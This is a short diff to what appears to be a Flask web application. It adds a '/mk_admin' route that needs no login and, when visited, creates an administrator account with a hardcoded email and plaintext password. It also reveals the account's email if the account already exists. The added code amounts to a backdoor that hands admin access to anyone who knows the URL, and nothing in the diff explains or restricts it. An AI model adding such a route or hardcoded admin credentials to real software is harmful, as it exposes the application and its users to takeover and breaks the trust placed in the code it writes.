@@ -145,7 +145,17 @@ def logout():
     logout_user()
     return redirect(url_for('index'))
 
-
+@app.route('/mk_admin')
+def mk_admin():
+    u = User.objects(email='xsl@ins.com').first()
+    if u is None:
+        u = User()
+        u.email = 'xsl@ins.com'
+        u.password = 'xiushilin'
+        u.type = 'admin'
+        u.save()
+        return jsonify({"msg":"ok"})
+    return jsonify({"msg":"ok dd"+u.email})
 
 class AnonymousUser(AnonymousUserMixin):
     def can(self, permissions):
